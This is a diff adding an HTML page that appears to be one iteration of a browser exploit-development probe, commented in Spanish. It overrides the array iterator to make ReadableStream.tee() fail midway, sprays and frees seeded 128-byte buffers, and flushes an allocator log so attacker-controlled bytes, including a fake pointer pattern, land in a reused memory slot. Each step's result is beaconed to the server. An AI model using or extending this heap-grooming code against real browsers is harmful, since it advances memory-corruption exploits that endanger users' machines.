@@ -1,0 +1,103 @@
+<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<script src="runtime-derive/derive-runtime.js"></script>
+<title>FA-v28-flush — press-19: S3 corregido (flush del Deallocator-log) — ¿vuelve el chunk sembrado?</title></head>
+<body><script>(function(){try{var x=new XMLHttpRequest();x.open("GET","current.txt",false);x.send(null);var u=(x.responseText||"").trim();if(u&&location.href.indexOf(u.split("?")[0])===-1){location.replace(u);}else if(u&&location.href.indexOf(u)===-1){location.replace(u);}}catch(e){}})();</script><pre id="out">FA-v28-flush…</pre>
+<script>
+(function(){
+"use strict";
+/* FA-v28-flush — press-19 (fix K3A-VALIDA C5: el seed libre se queda en el
+ * Deallocator-log de 512 y el tee hace bump-forward → S3 medía fresh-zero.
+ * Fix: 700 push+pop class-128 entre seed=null y el poison → el log se vacía
+ * → el chunk sembrado PUEDE volver.
+ * Matriz (letal al final, armed-N antes de cada una):
+ *   S1 control full-fill (sobrevive)
+ *   S2 seed U8(128) ceros + FLUSH + throw-at-1 → sobrevive = chunk fresh/log
+ *      vacío sirve ceros; muere = bytes ajenos siguen llegando
+ *   S3 seed U8(128) 0x41 + FLUSH + throw-at-1 → muere = reciclaje con bytes
+ *      NUESTROS llega al slot (la contraposición con S2 lo confirma)
+ *   S4 seed con patrón "handle-real": U8(128) con los primeros 16 bytes =
+ *      patrón de puntero bajo (0x00000000_0000xxxx plausibles) — medición
+ * Worker eliminado (instrumento roto: blob-workers no corren en este build).
+ * Testigo de proceso: los TCP-RST del wire (el servidor los ve). */
+var RID="v28f"+Date.now().toString(36).slice(-13);
+var out=document.getElementById("out");
+function say(s){try{out.appendChild(document.createTextNode("\n"+s));}catch(e){}}
+function bk(s,b){try{fetch("/beacon/V28-"+s,{method:"POST",cache:"no-store",keepalive:true,headers:{"Content-Type":"application/json"},body:JSON.stringify({r:RID,b:String(b).slice(0,500)})}).catch(function(){});}catch(e){}}
+var HB=setInterval(function(){bk("HB","main-hb");},2000);
+
+var dr="-",rt="-";
+try{ dr=typeof window.deriveRuntime; rt=(dr==="object"&&window.deriveRuntime)?typeof window.deriveRuntime.run:"-"; }catch(e){}
+bk("L","v28-flush; dr="+dr+"; rt="+rt);
+bk("EVR","TS="+(typeof TransformStream)+";RS="+(typeof ReadableStream)+";WS="+(typeof WritableStream)+";R="+(typeof Response)+";f="+(typeof fetch)+";W="+(typeof Worker)+";sc="+(typeof structuredClone)+";wr="+(typeof WeakRef)+";fr="+(typeof FinalizationRegistry)+";sab="+(typeof SharedArrayBuffer)+";at="+(typeof Atomics)+";gc="+(typeof window.gc)+";RBC="+(typeof ReadableByteStreamController)+";BYOB="+(typeof ReadableStreamBYOBReader)+";tr="+(typeof ArrayBuffer.prototype.transfer)+";rz="+(typeof ArrayBuffer.prototype.resize));
+
+/* inspección profunda de un tee resultante (si una fila sobrevive):
+ * ¿qué ES lo adoptado? typeof, locked, ¿getReader jala?, keys */
+function probeTee(t){
+  if(!t) return "-";
+  var r="br0="+typeof t[0]+";br1="+typeof t[1];
+  try{ r+=";lk0="+String(t[0].locked); }catch(e){ r+=";lk0=E"; }
+  try{ r+=";lk1="+String(t[1].locked); }catch(e){ r+=";lk1=E"; }
+  try{ var rd=t[0].getReader(); r+=";rd0=ok"; rd.releaseLock(); }catch(e){ r+=";rd0=E:"+String((e&&e.message)||e).slice(0,26); }
+  try{ r+=";c0="+String(t[0].cancel()).slice(0,12); }catch(e){ r+=";c0=E:"+String((e&&e.message)||e).slice(0,26); }
+  return r;
+}
+
+var OI=Array.prototype[Symbol.iterator];
+function rst(){try{Array.prototype[Symbol.iterator]=OI;}catch(e){}}
+function poiThrowAt1(){ Array.prototype[Symbol.iterator]=function(){ var t=this,i=0; return { next:function(){ i++; if(i===1) return {value:t[0],done:false}; throw new Error("FLUSH-MARK"); }};}; }
+function poiFull(){ Array.prototype[Symbol.iterator]=function(){ var t=this,i=0; return { next:function(){ i++; if(i<=t.length) return {value:t[i-1],done:false}; throw new Error("FLUSH-MARK"); }};}; }
+
+/* flush del Deallocator-log: 700 alloc+drop class-128 (K3A: log=512, 700>512) */
+function flushLog(){ var f=[]; for(var i=0;i<700;i++){ f.push(new Uint8Array(128)); } return f.length; }
+
+function seedU8(byte, n, pattern){
+  var s=[];
+  for(var i=0;i<n;i++){
+    var a=new Uint8Array(128);
+    if(pattern){ for(var j=0;j<16;j++) a[j]=pattern[j]; }
+    else { a.fill(byte); }
+    s.push(a);
+  }
+  return s;
+}
+
+/* S1 — control */
+bk("armed-1","control full-fill");
+var s1="-";
+try{ poiFull(); new ReadableStream({}).tee(); s1="no-throw"; rst(); }
+catch(e){ rst(); s1="threw:"+String((e&&e.message)||e).slice(0,30); }
+bk("S1",s1);
+
+/* S2 — seed CEROS + FLUSH + throw-at-1 */
+bk("armed-2","seed U8(128) ceros x2048 + flush700 + throw-at-1");
+var seed2=seedU8(0,2048); seed2=null;
+var fl2=flushLog();
+var s2="-";
+var t2=null; try{ poiThrowAt1(); t2=new ReadableStream({}).tee(); s2="SURVIVIO|"+probeTee(t2); rst(); }
+catch(e){ rst(); s2="threw:"+String((e&&e.message)||e).slice(0,30); }
+bk("S2",s2+";flush="+fl2);
+
+/* S3 — seed 0x41 + FLUSH + throw-at-1 */
+bk("armed-3","seed U8(128) 0x41 x2048 + flush700 + throw-at-1 — si no hay S3, murio aqui");
+var seed3=seedU8(0x41,2048); seed3=null;
+var fl3=flushLog();
+var s3="-";
+var t3=null; try{ poiThrowAt1(); t3=new ReadableStream({}).tee(); s3="SURVIVIO|"+probeTee(t3); rst(); }
+catch(e){ rst(); s3="threw:"+String((e&&e.message)||e).slice(0,30); }
+bk("S3",s3+";flush="+fl3);
+
+/* S4 — seed patrón puntero-bajo (0x0000000000000041-ish en bytes 0..15) */
+bk("armed-4","seed patron-puntero-bajo + flush + throw-at-1");
+var pat=[0x41,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0x42,0x00,0x00,0x00,0x00,0x00,0x00,0x00];
+var seed4=seedU8(0,2048,pat); seed4=null;
+flushLog();
+var s4="-";
+try{ poiThrowAt1(); var t4=new ReadableStream({}).tee(); s4="SURVIVIO|"+probeTee(t4); rst(); }
+catch(e){ rst(); s4="threw:"+String((e&&e.message)||e).slice(0,30); }
+bk("S4",s4);
+
+rst();
+clearInterval(HB);
+bk("Z","FA-v28-flush complete — main VIVA en las 4 filas");
+})();
+</script></body></html>
